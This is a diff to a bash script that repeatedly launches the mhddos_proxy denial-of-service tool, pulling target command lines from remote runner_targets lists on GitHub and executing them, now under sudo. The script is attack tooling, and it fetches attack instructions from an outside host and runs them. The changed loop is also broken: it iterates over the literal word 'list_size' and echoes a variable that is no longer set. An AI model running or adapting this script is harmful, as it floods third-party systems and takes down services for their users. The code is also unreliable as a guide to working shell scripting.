@@ -53,24 +53,20 @@ do
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
    
-   for i in list_size
-   do
-             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
-             echo -e "    "$target"\n"
-   done
       
    # Launch multiple mhddos_proxy instances with different targets.
-   for i in $random_numbers
+   for i in list_size
    do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
+            echo -e "    "$target"\n"
            
             echo "command line"
             echo $cmd_line
             echo "full cmd"
             
-            echo $proxy_interval $threads $rpc
-            python3 ~/mhddos_proxy/$cmd_line $proxy_interval $threads $rpc
+            echo "$proxy_interval $threads $rpc"
+            sudo python3 ~/mhddos_proxy/$cmd_line $proxy_interval $threads $rpc
    done
 echo -e "#####################################\n"
 sleep $restart_interval
